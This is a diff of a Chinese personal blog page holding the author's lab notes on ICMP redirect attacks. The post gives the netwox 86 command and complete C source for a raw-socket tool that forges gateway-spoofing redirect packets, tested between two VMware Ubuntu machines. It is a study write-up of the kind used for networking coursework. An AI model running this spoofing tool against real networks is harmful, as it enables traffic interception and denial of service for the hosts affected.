@@ -6,14 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2020/6 | Dayu Fang&#39;s blog</title>
+  <title>ICMP重定向攻击 | Dayu Fang&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Dayu Fang&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/archives/2020/06/index.html">
+  <meta name="description" content="ICMP重定向攻击学习笔记 这次学习的内容是关于ICMP重定向攻击的，TCP&#x2F;IP协议在设计之初仅考虑了成本和实现功能，并没有过多考虑安全因素。因此TCP&#x2F;IP协议栈中提供了大量的起关键作用的信息和指令，但是这些信息和指令的执行缺乏认证机制，能够方便地伪造。由于历史原因，这些漏洞一直被保留，最多进行过简单的修补。而ICMP重定向信息作为TCP&#x2F;IP协议栈的一部分，可以加深TCP&#x2F;IP协议的具体">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ICMP重定向攻击">
+<meta property="og:url" content="http://yoursite.com/2020/06/17/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/index.html">
 <meta property="og:site_name" content="Dayu Fang&#39;s blog">
+<meta property="og:description" content="ICMP重定向攻击学习笔记 这次学习的内容是关于ICMP重定向攻击的，TCP&#x2F;IP协议在设计之初仅考虑了成本和实现功能，并没有过多考虑安全因素。因此TCP&#x2F;IP协议栈中提供了大量的起关键作用的信息和指令，但是这些信息和指令的执行缺乏认证机制，能够方便地伪造。由于历史原因，这些漏洞一直被保留，最多进行过简单的修补。而ICMP重定向信息作为TCP&#x2F;IP协议栈的一部分，可以加深TCP&#x2F;IP协议的具体">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-06-17T14:14:06.000Z">
+<meta property="article:modified_time" content="2020-06-17T15:10:01.465Z">
 <meta property="article:author" content="Dayu Fang">
+<meta property="article:tag" content="ICMP">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Dayu Fang&#39;s blog" type="application/atom+xml">
@@ -146,36 +151,196 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-ICMP重定向攻击" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/06/17/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/" class="archive-article-date">
-  	<time datetime="2020-06-17T14:14:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-17</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/06/17/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/">ICMP重定向攻击</a>
+    <h1 class="article-title" itemprop="name">
+      ICMP重定向攻击
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2020/06/17/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/" class="archive-article-date">
+  	<time datetime="2020-06-17T14:14:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <meta name="referrer" content="no-referrer"/>
+
+<h1 id="ICMP重定向攻击学习笔记"><a href="#ICMP重定向攻击学习笔记" class="headerlink" title="ICMP重定向攻击学习笔记"></a>ICMP重定向攻击学习笔记</h1><blockquote>
+<p>这次学习的内容是关于ICMP重定向攻击的，TCP/IP协议在设计之初仅考虑了成本和实现功能，并没有过多考虑安全因素。因此TCP/IP协议栈中提供了大量的起关键作用的信息和指令，但是这些信息和指令的执行缺乏认证机制，能够方便地伪造。由于历史原因，这些漏洞一直被保留，最多进行过简单的修补。而ICMP重定向信息作为TCP/IP协议栈的一部分，可以加深TCP/IP协议的具体机制的理解。</p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="ICMP攻击原理"><a href="#ICMP攻击原理" class="headerlink" title="ICMP攻击原理"></a>ICMP攻击原理</h2><p><strong>ICMP重定向信息</strong>是路由器向主机提供实时的路由信息，当一个主机收到ICMP重定向信息时，它就会根据这个信息来更新自己的路由表。由于缺乏必要的合法性检查，如果一个黑客想要被攻击的主机修改它的路由表，黑客就会发送ICMP重定向信息给被攻击的主机，让该主机按照黑客的要求来修改路由表。</p>
+<h3 id="VMware模拟重定向攻击"><a href="#VMware模拟重定向攻击" class="headerlink" title="VMware模拟重定向攻击"></a>VMware模拟重定向攻击</h3><p>在<strong>VMware虚拟环境</strong>中（Virtual Box不同），xxx.xxx.xxx.2是默认的网关地址（linux下通过route命令可以查看当前的网关和路由信息）；所以攻击者可以冒充网关发出重定向包，通知受害者修改自己的网关为攻击者指定的gw地址；如果伪造的gw是自身，可以实现中间人攻击或者DOS攻击（没有启动IP转发功能）；如果是随意IP（不能到达或不负责转发），则可以导致DOS攻击。</p>
+<p>具体<strong>关于VMWare组网</strong>的基本原理可以参考：<a href="http://blog.csdn.net/lionhunter2010/archive/2007/12/19/1954276.aspx" target="_blank" rel="noopener">http://blog.csdn.net/lionhunter2010/archive/2007/12/19/1954276.aspx</a></p>
+<h2 id="netwox重定向攻击"><a href="#netwox重定向攻击" class="headerlink" title="netwox重定向攻击"></a>netwox重定向攻击</h2><h3 id="Linux系统下netwox命令进行重定向攻击"><a href="#Linux系统下netwox命令进行重定向攻击" class="headerlink" title="Linux系统下netwox命令进行重定向攻击"></a>Linux系统下netwox命令进行重定向攻击</h3><p>首先，我在本机的VMware上安装了2台Ubuntu虚拟机，为了区分两台虚拟机，一台采用ubnutu14安装包安装Linux（命名为Ubuntu），一台采用Ubnutu18安装包安装Linux（命名为UbuntuTest），两台虚拟机的用户都为fang,为了实现发送netwox重定向包,先用ifconfig命令查看本机的ip地址，以下为操作截图：<br>    Ubuntu的地址为：192.168.247.136</p>
+<pre><code>![](https://fangdayu.github.io/images/ICMP/ICMP1.png)
+
+&lt;img src=&quot;/images/ICMP/ICMP1.png&quot;&gt;
+
+UbuntuTest的地址为：192.168.247.132</code></pre><p>然后在Ubuntu虚拟机终端输入命令sudo netwox 86 –gw 192.168.247.220 –src-ip 192.168.247.2对UbnutuTest虚拟机进行icmp重定向攻击，并采用wireshark进行抓包，攻击及抓包过程截图如下：<br>1.1.在Ubnutu进行ICMP重定向攻击</p>
+<p>1.2.此时可以看到UbnuteTest进行ping百度的时候出现了问题</p>
+<p>1.3.退出重定向攻击</p>
+<p>1.4.这边ping百度恢复了正常<br> 1.5.用wireshark抓取ICMP重定向攻击包，可以看到在重定向攻击包中有网关地址192.168.247.220</p>
+<ol start="2">
+<li>使用raw socket，写出来一个icmp redirect包，达到使受害者不能正常上网的目的<br>2.1.首先先模拟一下ICMP攻击，先在虚拟机Ubnutu上采用gcc编译一下写好的ICMPAttack.c文件，生成ICMPAttack文件，然后sudo ./ICMPAttack发动攻击，接着在虚拟机UbnutuTest上ping <a href="http://www.baidu.com,可以看到攻击前可以ping通，攻击完之后重定向网关就被修改为了192.168.247.136，具体如下图所示：">www.baidu.com,可以看到攻击前可以ping通，攻击完之后重定向网关就被修改为了192.168.247.136，具体如下图所示：</a></li>
+</ol>
+<p>2.2.通过wireshark抓取ICMPAttack发出的重定向攻击包，可以看到确实是有源地址192.168.247.2,目的地址192.168.247.132的ICMP包，具体如下图：</p>
+<p>  点开ICMP攻击包可以看到构造的攻击包字段，包括校验和部分都构造成功，具体如下图：</p>
+<p>  2.3.ICMPAttack主要部分代码：<br>    在重定向攻击文件中，我是把网关IP地址，攻击主机IP地址和被攻击主机IP地址都写在了代码源文件中(实现的ICMP攻击就是将被攻击主机的网关IP地址变为攻击主机的IP地址)，具体定义如下：</p>
+<p>然后构造过程中，具体先捕获相应的ICMP数据包然后截取数据部分内容构造攻击的ICMP重定向数据包构造，部分代码如下：(具体代码可以查看第三部分完整源代码部分)</p>
+<ol start="3">
+<li>实验所用的ICMPAttack.c文件的完整源代码，具体如下：<br>#include &lt;stdlib.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;time.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;linux/ip.h&gt;<br>#include &lt;linux/icmp.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#include &lt;pcap.h&gt;</li>
+</ol>
+<p>#define SIZE_ETHERNET 14<br>#define MAX 1024</p>
+<p>int flag = 0;<br>const unsigned char *Ori_Gw_IP = “192.168.247.2”;  //网关IP地址 192.168.247.2<br>const unsigned char *Redic_IP = “192.168.247.136”; //攻击主机 192.168.247.136<br>const unsigned char *Vic_IP = “192.168.247.132”;   //被攻击主机 192.168.247.132</p>
+<p>/* IP 字段定义 */<br>struct ip_header //总长度20字节<br>{<br>    u_int8_t ip_header_length : 4;    //ip包头长度<br>    u_int8_t ip_version : 4;          //ip版本<br>    u_int8_t ip_tos;                  //服务类型<br>    u_int16_t ip_length;              //总长度<br>    u_int16_t ip_id;                  //标志<br>    u_int16_t ip_off;                 //分片偏移<br>    u_int8_t ip_ttl;                  //生存时间<br>    u_int8_t ip_protocol;             //协议<br>    u_int16_t ip_checksum;            //校验和<br>    struct in_addr ip_source_address; //in_addr表示32位的IPv4地址的结构体<br>    struct in_addr ip_destination_address;<br>};</p>
+<p>/* icmp 字段定义 */<br>struct icmp_header<br>{<br>    u_int8_t icmp_type;      //类型<br>    u_int8_t icmp_code;      //代码<br>    u_int16_t icmp_checksum; //校验和<br>    struct in_addr icmp_gateway_addr;<br>};</p>
+<p>/* 校验和计算 (依据 myping5.c 文件构造) */<br>u_int16_t checksum(u_int8_t *buf, int len)<br>{<br>    u_int32_t sum = 0; //4字节<br>    u_int16_t *cbuf;</p>
+<pre><code>cbuf = (u_int16_t *)buf; //每两字节二进制相加
+
+while (len &gt; 1)
+{
+    sum += *cbuf++;
+    len -= 2; //长度的单位是8bit
+}
+
+if (len)
+    sum += *(u_int8_t *)cbuf;
+
+sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff); //将高于16位（右移）与低16位（高位填充0）相加
+sum += (sum &gt;&gt; 16);                 //如果还有高于16位，将继续与低16位相加
+
+return ~sum; //对sum取反(返回的是十进制)</code></pre><p>}</p>
+<p>/* 捕获ICMP数据包 */<br>void getPacket(u_char *arg, const struct pcap_pkthdr *pkthdr, const u_char *packet)<br>{<br>    int sockfd, res; //sockfd是socket描述符<br>    int one = 1;<br>    int *ptr_one = &one;</p>
+<pre><code>// 确定构造的是ICMP数据包
+if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) &lt; 0)
+{
+    printf(&quot;***** create sockfd error *****\n&quot;);
+    exit(-1);
+}
+
+// 依据Socket类型选择了IPPROTO_ICMP，需要自定义头部
+res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, ptr_one, sizeof(one));
+if (res &lt; 0)
+{
+    printf(&quot;***** setsockopt error *****\n&quot;);
+    exit(-3);
+}
+
+// 填充数据部分
+ping_redirect(sockfd, packet, 0);</code></pre><p>}</p>
+<p>/* 重定向报文构造 */<br>void ping_redirect(int sockfd, const unsigned char *data, int datalen)<br>{<br>    char buf[MAX], *p;</p>
+<pre><code>struct ip_header *ip;
+struct icmp_header *icmp;
+
+int len, i;
+
+//报文
+struct packet
+{
+    struct iphdr ip;
+    struct icmphdr icmp;
+    char datas[28];
+} packet;
+
+//添加IP头部
+packet.ip.version = 4;
+packet.ip.ihl = 5; //4B*5
+packet.ip.tos = 0; //服务类型
+packet.ip.tot_len = htons(56);
+packet.ip.id = getpid(); //标志
+packet.ip.frag_off = 0;
+packet.ip.ttl = 255;
+packet.ip.protocol = IPPROTO_ICMP;
+packet.ip.check = 0;
+packet.ip.saddr = inet_addr(Ori_Gw_IP); //冒充原始网关，inet_addr将点分十进制转换成一个u_long型
+packet.ip.daddr = inet_addr(Vic_IP);    //被攻击主机
+
+//添加ICMP头部
+packet.icmp.type = ICMP_REDIRECT;
+packet.icmp.code = ICMP_REDIR_HOST;
+packet.icmp.checksum = 0;
+packet.icmp.un.gateway = inet_addr(Redic_IP);
+
+//netinet/in.h
+struct sockaddr_in dest = {
+    .sin_family = AF_INET,
+    .sin_addr = {.s_addr = inet_addr(Vic_IP)}};
+
+//从源数据包的内存地址的起始地址开始，拷贝28个字节到目标地址所指的起始位置中
+memcpy(packet.datas, (data + SIZE_ETHERNET), 28);
+packet.ip.check = checksum(&amp;packet.ip, sizeof(packet.ip));
+packet.icmp.checksum = checksum(&amp;packet.icmp, sizeof(packet.icmp) + 28);
+
+//发送ICMP重定向报文
+sendto(sockfd, &amp;packet, 56, 0, (struct sockaddr *)&amp;dest, sizeof(dest));
+
+printf(&quot;send packet...\n&quot;);</code></pre><p>}</p>
+<p>/* 程序入口 主函数 */<br>int main()<br>{<br>    char errBuf[PCAP_ERRBUF_SIZE], *devStr;</p>
+<pre><code>// 查找网络设备
+devStr = pcap_lookupdev(errBuf);
+
+if (devStr)
+{
+    printf(&quot;running...\n- device of my computer: %s\n&quot;, devStr);
+}
+else
+{
+    printf(&quot;run error: %s\n&quot;, errBuf);
+    exit(1);
+}
+
+// 打开一个用于捕获数据的接口
+pcap_t *device = pcap_open_live(devStr, 65535, 1, 0, errBuf);
+printf(&quot;- device of pcap_open_live() is: %s\n&quot;, device);
+if (device == NULL)
+    printf(&quot;- error: %s\n&quot;, errBuf);
+
+// 循环捕获网络数据包
+int id = 0;
+pcap_loop(device, -1, getPacket, NULL);
+
+// 关闭
+pcap_close(device);
+return 0;</code></pre><p>}</p>
+<!--more-->
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>多谢打赏！<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -187,171 +352,106 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/06/17/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/06/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2020-06-11T14:17:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-11</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/06/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">数据结构学习笔记</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/06/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">数据结构学习笔记</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">数据结构</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/06/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2020-06-09T15:08:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-09</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/06/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">操作系统学习笔记</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">操作系统</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2020-06-08T13:44:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">计算机网络学习笔记</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机网络</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/06/07/Hexo%E5%BF%AB%E9%80%9F%E6%9E%84%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" class="archive-article-date">
-  	<time datetime="2020-06-07T07:14:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/06/07/Hexo%E5%BF%AB%E9%80%9F%E6%9E%84%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">Hexo初体验</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Hexo</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -374,8 +474,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
